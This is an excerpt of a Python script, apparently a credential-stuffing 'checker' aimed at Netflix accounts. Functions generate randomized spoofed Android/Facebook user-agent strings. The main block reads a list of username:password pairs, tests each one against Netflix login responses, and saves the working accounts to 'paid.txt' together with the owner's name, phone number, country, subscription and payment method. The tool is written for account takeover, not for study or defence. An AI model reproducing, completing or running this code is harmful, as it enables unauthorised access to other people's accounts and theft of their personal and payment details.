...
def levi34():
	...
	kt = random.choice(['com.netflix.katana','com.netflix.org.orca'])
...
def levi9():
	en = random.choice(['en_US','en_GB','en_PK','ru_RU','de_DE','th_TH','en_BD','en_IN','en_AF'])
	kt = random.choice(['com.faucetearner.org','com.faucetearner.org'])
	fbcr = random.choice(['o2 - de', 'Verizon - us','MY CELCOM','Vodafone - uk','null','DTAC','IND airtel','Nepal Telecom'])
	...
	by = "Dalvik/1.6.0 (Linux; U; Android 6.0; 480 Build/854) [FBAN/FB4A;FBAV/314.1.0.45.119;FBBV/314;FBDM/{density=3.0,width=480,height=854};FBLC/it_IT;FBRV/314.1.0.45.119;FBCR/Roshan;FBMF/Infinix_Note_8;FBBD/Infinix_Note_8;FBPN/com.faucetearner.org.katana;FBDV/Infinix_Note_8_6_0;FBSV/6.0;FBOP/1;FBCA/x86:armeabi-v7a;]"
	ff = "Dalvik/1.6.0 (Linux; U; Android 10.0; 480 Build/854) [FBAN/FB4A;FBAV/107.0.0.0.50;FBBV/107;FBDM/{density=3.0,width=480,height=854};FBLC/it_IT;FBRV/107.0.0.0.50;FBCR/Roshan;FBMF/Huawei_P40_Pro;FBBD/Huawei_P40_Pro;FBPN/com.faucetearner.org.katana;FBDV/Huawei_P40_Pro_10_0;FBSV/10.0;FBOP/1;FBCA/x86:armeabi-v7a;]"
	gp = "Dalvik/1.6.0 (Linux; U; Android 8.0; 1440 Build/2560) [FBAN/FB4A;FBAV/314.1.0.45.119;FBBV/314;FBDM/{density=3.0,width=1440,height=2560};FBLC/it_IT;FBRV/314.1.0.45.119;FBCR/Etisalat Afghanistan;FBMF/Infinix_Note_8i;FBBD/Infinix_Note_8i;FBPN/com.faucetearner.org.katana;FBDV/Infinix_Note_8i_8_0;FBSV/8.0;FBOP/1;FBCA/x86:armeabi-v7a;]"
	hc = "Dalvik/1.6.0 (Linux; U; Android 10.0; 1242 Build/2208) [FBAN/FB4A;FBAV/107.0.0.0.50;FBBV/107;FBDM/{density=3.0,width=1242,height=2208};FBLC/it_IT;FBRV/107.0.0.0.50;FBCR/Afghan Wireless;FBMF/Samsung_Galaxy_Note_20_Ultra;FBBD/Samsung_Galaxy_Note_20_Ultra;FBPN/com.faucetearner.org.katana;FBDV/Samsung_Galaxy_Note_20_Ultra_10_0;FBSV/10.0;FBOP/1;FBCA/x86:armeabi-v7a;]"
	kk = "Dalvik/1.6.0 (Linux; U; Android 7.0; 640 Build/1136) [FBAN/FB4A;FBAV/108.0.0.17.68;FBBV/108;FBDM/{density=3.0,width=640,height=1136};FBLC/it_IT;FBRV/108.0.0.17.68;FBCR/Etisalat Afghanistan;FBMF/Huawei_P40_Pro;FBBD/Huawei_P40_Pro;FBPN/com.faucetearner.org.katana;FBDV/Huawei_P40_Pro_7_0;FBSV/7.0;FBOP/1;FBCA/x86:armeabi-v7a;]"	
	ua = sd + el + by + ff + gp + hc + kk	
	return ua
def levi0():
	en = random.choice(['en_US','en_GB','en_PK','ru_RU','de_DE','th_TH','en_BD','en_IN','en_AF'])
	kt = random.choice(['com.faucetearner.org.katana','com.faucetearner.org.orca','com.faucetearner.org.mlite'])
	fbcr = random.choice(['o2 - de', 'Verizon - us','MY CELCOM','Vodafone - uk','null','DTAC','IND airtel','Nepal Telecom'])
	su= "[FBAN/FB4A;FBAV/"+str(random.randint(111,999))+'.0.0.'+str(random.randrange(9,99))+str(random.randint(111,999)) +";FBBV/"+str(random.randint(111111111,999999999))
	eb = ";[FBAN/FB4A;FBAV/266.0.0.56.124;FBBV/209027763;FBDM/{density=2.625,width=1080,height=2094};FBLC/"+en+";FBRV/209644275;FBCR/"+fbcr+";FBMF/samsung;FBBD/samsung;FBPN/"+kt+";FBDV/SM-N960U;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]"
	ua = su + eb	
...
if ask12 == 2:
    ...
    with open(levii,'r',encoding="utf-8") as file:
        levii = file.readlines()
        levii = [line.rstrip() for line in levii]
    ...
    try:
        ...
        if 'Incorrect email address or password' in response.text or 'Missing password' in response.text or 'NetflixId":null,"user":{"' in response.text:
            ...
            try:
                ...
                Payment_Method = ''
            print(f'\n{GREEN} {USER}:{PASS} | Country = {Country} | Max Streams = {Max_Streams} | first Name = {first_name} | last Name = {last_name} | Phone = {Phone} | Subscription = {Subscription} | Payment method = {Payment_Method} | Video quality = {Video_quality} | price = {price} | Netflix = {Netflix} | \n')
            with open('paid.txt','a',encoding='utf-8') as f:
                f.write(f'{USER}:{PASS} | Country = {Country} | Max Streams = {Max_Streams} | first Name = {first_name} | last Name = {last_name} | Phone = {Phone} | Subscription = {Subscription} | Payment method = {Payment_Method} | Video quality = {Video_quality} | price = {price} | Netflix = {Netflix} | \n')
